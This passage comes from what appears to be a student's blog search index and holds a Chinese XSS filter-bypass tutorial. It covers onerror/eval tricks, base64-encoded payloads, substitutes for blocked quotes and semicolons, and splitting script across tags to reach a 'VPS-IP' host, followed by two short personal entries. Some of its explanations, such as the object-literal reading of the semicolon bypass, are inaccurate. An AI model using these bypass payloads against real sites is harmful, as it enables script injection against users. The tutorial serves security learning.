apache"><span class="hljs-attribute">Uncaught</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure><p>在这段代码中，使用了SVG标签，SVG是可缩放矢量图形（Scalable Vector Graphics）的缩写，它是一种用于描述二维矢量图形的XML语言。SVG标签支持事件属性，<code>onload</code>事件在SVG图像加载完成时触发。</p><p>在<code>onload</code>事件属性中，使用了JavaScript代码来执行恶意操作：</p><ol><li><code>window.onerror=eval;</code>：将<code>window.onerror</code>属性设置为<code>eval</code>函数。<code>window.onerror</code>是JavaScript中的一个全局事件处理函数，用于捕获JavaScript运行时发生的错误。将它设置为<code>eval</code>函数相当于告诉浏览器，当发生错误时，使用<code>eval</code>函数来处理错误。</li><li><code>throw&#39;=alert\x281\x29&#39;;</code>：这部分代码是一个抛出异常的语句。<code>throw</code>用于抛出异常，<code>alert\x281\x29</code>是被抛出的异常的内容。在这里，<code>alert\x281\x29</code>是对<code>alert(1)</code>的转义，<code>\x28</code>是<code>(</code>的转义。这样，异常的内容就变成了<code>&#39;alert(1)&#39;</code>。</li></ol><p>当SVG图像加载时，<code>onload</code>事件被触发。由于<code>window.onerror</code>被设置为<code>eval</code>函数，所以当异常被抛出时，<code>eval</code>函数会执行异常的内容，即<code>alert(1)</code>，从而弹出一个警示框。</p><h4 id="5-单引号过滤"><a href="#5-单引号过滤" class="headerlink" title="5.单引号过滤"></a>5.单引号过滤</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/NIKO/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>传递给<code>alert()</code>函数的参数是一个正则表达式<code>/NIKO/</code>。正则表达式是一种用于匹配字符串模式的工具。<code>/NIKO/</code>表示匹配包含文本<code>NIKO</code>的任何字符串。因此，当浏览器解析这段代码时，会弹出一个警示框，显示文本<code>/NIKO/</code>。</p><h5 id="1-利用其他JS函数替换"><a href="#1-利用其他JS函数替换" class="headerlink" title="1.利用其他JS函数替换"></a>1.利用其他JS函数替换</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">prompt</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>&lt;script&gt;</code>标签用于包裹JavaScript代码。prompt()是JavaScript中的一个全局函数，用于显示一个包含文本输入字段的提示框，它会等待用户输入文本后返回输入的内容。</p></blockquote><p><code>prompt(&#39;NIKO&#39;)</code>表示弹出一个提示框，其中显示文本<code>NIKO</code>，然后等待用户输入。用户可以在提示框中输入任意文本，并点击确定按钮或取消按钮来确认或取消输入。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>confirm()</code>是JavaScript中的一个全局函数，用于显示一个带有“确定”和“取消”两个按钮的确认框。当用户点击“确定”按钮时，<code>confirm()</code>函数返回<code>true</code>；当用户点击“取消”按钮时，<code>confirm()</code>函数返回<code>false</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>console.log()</code>是JavaScript中的一个全局函数，用于在浏览器的控制台输出消息。当浏览器解析这段代码时，<code>console.log()</code>函数会将<code>NIKO</code>打印到控制台中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;NIKO&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>document.write()</code>是JavaScript中的一个方法，用于向网页中写入内容。它可以将指定的文本或HTML代码直接输出到网页上。当浏览器解析这段代码时，会将<code>NIKO</code>添加到当前网页的位置，并覆盖原有的内容。</p><h5 id="2-编码绕过-1"><a href="#2-编码绕过-1" class="headerlink" title="2.编码绕过"></a>2.编码绕过</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;Function`a$&#123;atob`YWxlcnQoMSk=`&#125;```&quot;</span>&gt;</span><br>#alert(1)<br></code></pre></td></tr></table></figure><blockquote><p><code>&lt;img src=x onerror=&quot;Functiona$&#123;atobYWxlcnQoMSk=&#125;```&quot;&gt;</code>：这是一个<img>标签，其中使用了<code>onerror</code>事件属性。当图片加载失败时，<code>onerror</code>事件会触发，从而执行其中的JavaScript代码。</p><p>在这里，使用了ES6的Template Literal语法，即反引号来定义字符串模板。在模板中，<code>$&#123;...&#125;</code>表示插入表达式，表达式<code>atob</code>是JavaScript中的全局函数，用于将Base64编码解码为原始文本。<code>atob</code>函数接受参数<code>YWxlcnQoMSk=</code>，它是Base64编码的字符串<code>alert(1)</code>。</p><p>因此，这部分代码的目的是将Base64编码的字符串<code>alert(1)</code>解码，并构造一个新的函数，然后执行这个新的函数。</p></blockquote><p>当浏览器解析这段代码时，<code>&lt;img&gt;</code>标签的<code>onerror</code>事件被触发，导致JavaScript代码执行。JavaScript会将Base64编码<code>YWxlcnQoMSk=</code>解码为原始文本<code>alert(1)</code>，然后构造一个新的函数，并立即执行这个函数，弹出一个警示框显示数字1。</p><h4 id="7-长度限制"><a href="#7-长度限制" class="headerlink" title="7.长度限制"></a>7.长度限制</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=<span class="hljs-string">&#x27;document.write(&quot;&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;&lt;a href=ht&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;tp://VPS-IP:po&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">a=a+<span class="hljs-string">&#x27;rt&gt;NIKO&lt;/a&gt;&quot;)&#x27;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><ol><li><code>&lt;script&gt;a=&#39;document.write(&quot;&#39;&lt;/script&gt;</code>：在第一个<code>&lt;script&gt;</code>标签中，定义了一个变量<code>a</code>并赋值为<code>document.write(&quot;</code>，即将文本<code>document.write(&quot;</code>赋值给变量<code>a</code>。</li><li><code>&lt;script&gt;a=a+&#39;&lt;a href=ht&#39;&lt;/script&gt;</code>：在第二个<code>&lt;script&gt;</code>标签中，将之前定义的变量<code>a</code>与文本<code>&lt;a href=ht</code>拼接在一起，即将<code>&lt;a href=ht</code>添加到变量<code>a</code>的末尾。</li><li><code>&lt;script&gt;a=a+&#39;tp://VPS-IP:po&#39;&lt;/script&gt;</code>：在第三个<code>&lt;script&gt;</code>标签中，将之前定义的变量<code>a</code>与文本<code>tp://VPS-IP:po</code>拼接在一起，即将<code>tp://VPS-IP:po</code>添加到变量<code>a</code>的末尾。</li><li><code>&lt;script&gt;a=a+&#39;rt&gt;NIKO&lt;/a&gt;&quot;)&#39;&lt;/script&gt;</code>：在第四个<code>&lt;script&gt;</code>标签中，将之前定义的变量<code>a</code>与文本<code>rt&gt;NIKO&lt;/a&gt;&quot;)&#39;</code>拼接在一起，即将<code>rt&gt;NIKO&lt;/a&gt;&quot;)&#39;</code>添加到变量<code>a</code>的末尾。</li><li><code>&lt;script&gt;eval(a)&lt;/script&gt;</code>：在最后一个<code>&lt;script&gt;</code>标签中，使用<code>eval()</code>函数来执行变量<code>a</code>中的JavaScript代码。<code>eval()</code>函数会解析并执行其参数中的JavaScript代码。在这里，<code>eval(a)</code>相当于执行了以下代码：</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;a href=ht&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;tp://VPS-IP:po&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;rt&gt;NIKO&lt;/a&gt;&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="8-分号绕过"><a href="#8-分号绕过" class="headerlink" title="8.分号绕过"></a>8.分号绕过</h4><p>只过滤分号时可使用花括号隔离：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">&#123;onerror=alert&#125;<span class="hljs-keyword">throw</span> <span class="hljs-number">1</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用了对象字面量的语法，即<code>&#123;...&#125;</code>来创建一个对象。对象字面量是JavaScript中创建对象的一种简洁方式。</p><p>在这个例子中，对象字面量的内容是<code>&#123;onerror=alert&#125;</code>，它指定了一个名为<code>onerror</code>的属性，并将该属性的值设置为<code>alert</code>，即<code>&#123;onerror=alert&#125;</code>等价于<code>&#123;onerror: alert&#125;</code>。</p><p>接着，代码使用<code>throw</code>语句抛出一个异常，异常的内容是数字1。在正常情况下，这个异常应该被捕获和处理，但在这个例子中，没有处理异常的代码，所以浏览器会将异常作为错误抛出。</p><p>因为前面定义了对象字面量的<code>onerror</code>属性，而没有给<code>onerror</code>属性赋值一个函数，所以在抛出异常时，浏览器会执行<code>alert</code>函数，从而弹出一个警示框显示数字1。</p><h4 id="9-CSP绕过"><a href="#9-CSP绕过" class="headerlink" title="9.CSP绕过"></a>9.CSP绕过</h4><p>本人还没学到，时间仓促，只能先留个坑，学完再来填上||^||</p>]]></content>
    
    
    
    <tags>
      
      <tag>技术帖</tag>
      
      <tag>NIKO</tag>
      
      <tag>XSS</tag>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>多媒体大作业</title>
    <link href="/2024/11/25/%E5%A4%A7%E4%BD%9C%E4%B8%9A/"/>
    <url>/2024/11/25/%E5%A4%A7%E4%BD%9C%E4%B8%9A/</url>
    
    <content type="html"><![CDATA[<p><strong>这是多媒体技术的大作业</strong><br><strong>计科2204 1033220422 王骏飞</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>大作业</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自我介绍</title>
    <link href="/2024/11/25/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"/>
    <url>/2024/11/25/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<p><strong>姓名：</strong> 王骏飞<br><strong>英文名：</strong> NIKO<br><strong>爱好</strong> 游戏，音乐，羽毛球</p>]]></content>
    
    
    
    <tags>
      
      <tag>NIKO</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
